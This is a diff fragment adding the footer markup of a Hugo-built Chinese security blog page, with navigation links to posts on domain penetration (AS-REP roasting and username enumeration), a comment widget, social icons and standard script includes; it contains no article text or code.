+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">域渗透-AS_REPRoasting</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/kerberos_user_enumerate/">
+            <span class="next-text nav-default">域渗透-用户名枚举</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="https://github.com/Secd0g/" rel="me noopener" class="iconfont"
+      title="github"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
+</svg>
+
+    </a>
+  
+    <a href="https://www.zhihu.com/people/F0rmat" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://xxe.icu/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
+  </span>
+
+  <span class="copyright-year">
+    &copy;
+    
+      2017 -
+    2022
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        F0rmat
+        
+      </span></span>
+
+  
+  
+    <span id="busuanzi_container">
+      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
